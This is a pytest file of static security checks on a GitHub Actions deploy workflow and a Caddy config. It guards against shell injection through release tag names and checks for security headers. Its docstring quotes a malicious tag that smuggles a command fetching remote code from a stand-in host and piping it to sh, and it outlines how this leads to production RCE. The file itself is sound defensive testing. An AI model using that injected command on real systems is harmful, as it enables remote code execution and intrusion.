"""Deployment hardening: no shell injection from a ref name, headers present (#933).

`.github/workflows/deploy.yml` substituted `${{ github.event.release.tag_name }}`
straight into an unquoted heredoc piped to `ssh ... "bash -s"`. GitHub expands
`${{ }}` on the runner *before* the heredoc is written, and git ref names may
legally contain ';', '$( )', backticks and pipes — so a tag like

    v1.0.0";curl evil|sh;"

ran attacker-chosen shell on the runner **and** on the production host. That is
the escalation path from repo write access to production RCE.

These are static assertions over the shipped config files: there is no way to
execute the workflow in a unit test, and a lint that says "this value must not be
interpolated" is exactly the check that would have caught the original.
"""

import re
from pathlib import Path

import pytest

pytestmark = pytest.mark.v2

REPO_ROOT = Path(__file__).resolve().parents[2]
DEPLOY_WORKFLOW = REPO_ROOT / ".github" / "workflows" / "deploy.yml"
CADDYFILE = REPO_ROOT / "deploy" / "Caddyfile.example"
DEPLOY_README = REPO_ROOT / "deploy" / "README.md"


@pytest.fixture(scope="module")
def workflow() -> str:
    return DEPLOY_WORKFLOW.read_text()


#: Context values an outside contributor can influence. `github.sha` and
#: `github.actor` are excluded: they are not free-form text.
ATTACKER_CONTROLLED = [
    "github.event.release.tag_name",
    "github.ref_name",
]


class TestNoRefNameInterpolationInRunScripts:
    @pytest.mark.parametrize("expression", ATTACKER_CONTROLLED)
    def test_expression_is_never_interpolated_into_a_run_script(
        self, workflow: str, expression: str
    ):
        """`${{ ... }}` in `run:` is substituted as raw source text.

        The safe form is an `env:` entry — the shell then sees a variable whose
        value it never re-parses.
        """
        in_run_block = False
        offenders: list[str] = []

        for raw_line in workflow.splitlines():
            stripped = raw_line.strip()
            if re.match(r"^run:\s*\|", stripped):
                in_run_block = True
                run_indent = len(raw_line) - len(raw_line.lstrip())
                continue
            if in_run_block:
                indent = len(raw_line) - len(raw_line.lstrip())
                if stripped and indent <= run_indent:
                    in_run_block = False
                elif expression in raw_line:
                    offenders.append(stripped)

        assert not offenders, (
            f"{expression} is interpolated into a run script — pass it via env: "
            f"instead.\n" + "\n".join(f"  {o}" for o in offenders)
        )

    def test_release_tag_is_passed_as_an_env_var(self, workflow: str):
        assert "RELEASE_TAG: ${{ github.event.release.tag_name }}" in workflow

    def test_the_tag_is_base64_transported_into_the_remote_shell(self, workflow: str):
        """base64's alphabet has no shell metacharacters, so nothing can break out."""
        assert 'base64' in workflow
        assert 'RELEASE_TAG_B64' in workflow

    def test_git_checkout_of_the_tag_is_quoted(self, workflow: str):
        """An unquoted `git checkout $TAG_NAME` word-splits and globs."""
        assert re.search(r'git checkout "\\?\$TAG_NAME"', workflow), (
            "the tag checkout must be quoted"
        )
        assert not re.search(r"git checkout \\?\$TAG_NAME\s*$", workflow, re.M), (
            "found an unquoted `git checkout $TAG_NAME`"
        )


class TestCaddySecurityHeaders:
    @pytest.fixture(scope="class")
    def caddyfile(self) -> str:
        return CADDYFILE.read_text()

    @pytest.mark.parametrize(
        "header",
        [
            "Strict-Transport-Security",
            "X-Content-Type-Options",
            "Referrer-Policy",
            "X-Frame-Options",
        ],
    )
    def test_header_is_set(self, caddyfile: str, header: str):
        assert header in caddyfile, f"{header} missing from the Caddy site block"

    def test_headers_are_on_the_site_block_not_a_route(self, caddyfile: str):
        """They must cover /api/* and /auth/* too, not just the frontend.

        A `header` directive inside a matcher would only apply to that route —
        the backend routes carrying JWTs are the ones that had no headers at all.
        """
        site_start = caddyfile.index("codeframe.example.com {")
        backend_matcher = caddyfile.index("@backend")
        header_block = caddyfile.index("header {")

        assert site_start < header_block < backend_matcher, (
            "the header block must sit on the site block, above the route matchers"
        )

    def test_hsts_has_a_meaningful_max_age(self, caddyfile: str):
        match = re.search(r"Strict-Transport-Security\s+\"max-age=(\d+)", caddyfile)
        assert match, "HSTS max-age not parseable"
        assert int(match.group(1)) >= 31536000, "HSTS max-age should be >= 1 year"

    def test_preload_is_not_enabled_without_documentation(self, caddyfile: str):
        """preload is hard to reverse; it must not be switched on by an example."""
        hsts_line = re.search(r"Strict-Transport-Security.*", caddyfile).group(0)
        assert "preload" not in hsts_line

    def test_headers_are_documented_for_operators(self):
        readme = DEPLOY_README.read_text()

        for header in (
            "Strict-Transport-Security",
            "X-Content-Type-Options",
            "Referrer-Policy",
            "X-Frame-Options",
        ):
            assert header in readme, f"{header} is not documented in deploy/README.md"
        assert "preload" in readme, "the preload caveat must be documented"
